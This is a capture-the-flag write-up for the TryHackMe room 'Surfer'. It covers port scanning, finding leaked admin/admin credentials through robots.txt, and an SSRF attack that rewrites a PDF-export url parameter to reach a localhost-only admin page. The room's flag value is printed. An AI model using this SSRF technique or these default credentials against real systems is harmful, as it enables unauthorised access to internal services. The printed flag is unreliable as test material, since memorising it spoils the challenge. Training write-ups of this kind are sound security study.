#  Surfer

> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Category:** Web / SSRF  
> **Date Completed:** 2026-03-17
  
> **Room Link:** [https://tryhackme.com/room/surfer](https://tryhackme.com/room/surfer)

---

##  Table of Contents

1. [Room Overview](#room-overview)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Flags](#flags)
6. [Key Takeaways](#key-takeaways)

---

##  Room Overview

Surfer is an SSRF (Server-Side Request Forgery) challenge built around a "24X7 System+" dashboard. The app includes a PDF export feature that fetches a URL server-side — making it the perfect vector to reach an internal admin page that is blocked from external access. Credentials are recovered from a leaked chat log in `robots.txt`, and the flag is extracted by forging the PDF export request to point at `http://127.0.0.1/internal/admin.php`.

**Goal:**  
Exploit the SSRF vulnerability in the PDF export feature to access the internally-restricted `/internal/admin.php` page and retrieve the flag.

**Skills Practiced:**  
Rustscan port scanning, `robots.txt` recon, leaked credential discovery, SSRF via POST parameter manipulation, Burp Suite request interception.

---

##  Reconnaissance

### Port Scanning

```bash
export RHOSTS=10.48.149.72

rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
```

**Findings:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 |
| 80   | HTTP    | Apache httpd 2.4.38 (Debian) |

The HTTP server redirects to `/login.php`. The Nmap script scan also notes a disallowed entry in `robots.txt`.

### Adding to `/etc/hosts`

```bash
echo "$RHOSTS surfer.thm" | tee -a /etc/hosts
```

---

##  Enumeration

### robots.txt

```bash
curl http://surfer.thm/robots.txt
```

```
User-Agent: *
Disallow: /backup/chat.txt
```

A hidden backup directory is disallowed — worth investigating directly.

### /backup/chat.txt

```bash
curl http://surfer.thm/backup/chat.txt
```

```
Admin: I have finished setting up the new export2pdf tool.
Kate: Thanks, we will require daily system reports in pdf format.
Admin: Yes, I am updated about that.
Kate: Have you finished adding the internal server.
Admin: Yes, it should be serving flag from now.
Kate: Also Don't forget to change the creds, plz stop using your username as password.
Kate: Hello.. ?
```

**Key findings:**
- An `export2pdf` tool exists — fetches URLs server-side
- An internal page serves the flag
- Kate warns Admin to stop using the username as the password

**Credentials derived: `admin` / `admin`**

### Web Application — Dashboard

Logging in at `http://surfer.thm/login.php` with `admin:admin` grants access to the 24X7 System+ dashboard.

**Dashboard observations:**

- **Hosting Server Information** — The server IP is listed as `172.17.0.2` (a Docker container IP), suggesting the app runs inside a container.
- **Recent Activity** — An entry reads: *"Internal pages hosted at `/internal/admin.php`. It contains the system flag."*
- **Export Reports** — A button labelled "Export to PDF" sends a POST request to `export2pdf.php` with a `url` parameter.

### Attempting Direct Access

Visiting `http://surfer.thm/internal/admin.php` directly returns:

```
This page can only be accessed locally.
```

The page is restricted to `localhost` / `127.0.0.1` — external requests are blocked.

---

##  Exploitation

### Vulnerability

**Type:** Server-Side Request Forgery (SSRF)  
**CVE:** N/A  
**Description:**  
The `export2pdf.php` endpoint accepts a `url` parameter via POST and fetches that URL server-side to generate a PDF. Because the request originates from the server itself, it bypasses the `127.0.0.1`-only restriction on `/internal/admin.php`. By intercepting the export request and replacing the `url` value with the internal admin URL, the server fetches and renders the flag page into the PDF.

---

### Steps

**Step 1 — Intercept the PDF export request in Burp Suite**

Click "Export to PDF" on the dashboard while Burp Suite's intercept is active. The captured POST request to `export2pdf.php` looks like:

```http
POST /export2pdf.php HTTP/1.1
Host: surfer.thm
Content-Type: application/x-www-form-urlencoded
...

url=http%3A%2F%2F127.0.0.1%2Fserver-info.php
```

The `url` parameter controls what the server fetches.

**Step 2 — Modify the `url` parameter**

Replace the `url` value with the internal admin page:

```
url=http%3A%2F%2F127.0.0.1%2Finternal%2Fadmin.php
```

Decoded: `http://127.0.0.1/internal/admin.php`

**Step 3 — Forward the modified request**

The server fetches `http://127.0.0.1/internal/admin.php` from localhost, bypassing the external access restriction, and returns the page content rendered as a PDF — with the flag visible inside.

---

##  Flags

| Flag | Value |
|------|-------|
| Room Flag | `flag{6255c55660e292cf0116c053c9937810}` |

---

##  Key Takeaways

- **`robots.txt` disallow entries are a recon goldmine.** The `Disallow: /backup/chat.txt` entry handed over the existence of an internal tool, a flag hint, and a credential leak — all in one file.
- **Never use your username as your password.** Kate literally warned the admin in the chat. `admin:admin` should never reach production.
- **SSRF turns "internal only" restrictions into paper walls.** Any feature that fetches a URL server-side can potentially be abused to access services bound to `localhost`, internal Docker networks, or cloud metadata endpoints (like AWS `169.254.169.254`).
- **The `url` parameter in PDF generators is a classic SSRF vector.** Tools like wkhtmltopdf or headless browsers fetching arbitrary URLs are common targets — always validate and restrict the URLs they can reach.
- **Container IPs (`172.17.x.x`) signal Docker environments.** This is useful for identifying the network topology and potentially pivoting to other containers.

---

##  Tools Used

| Tool | Purpose |
|------|---------|
| Rustscan | Fast full-port scanning |
| curl | Fetching `robots.txt` and `backup/chat.txt` |
| Browser | Dashboard exploration and activity log review |
| Burp Suite | Intercepting and modifying the POST request to `export2pdf.php` |

---

##  References

- [OWASP — SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [HackTricks — SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [PortSwigger — SSRF Labs](https://portswigger.net/web-security/ssrf)

---

*Writeup by Avaneesh*
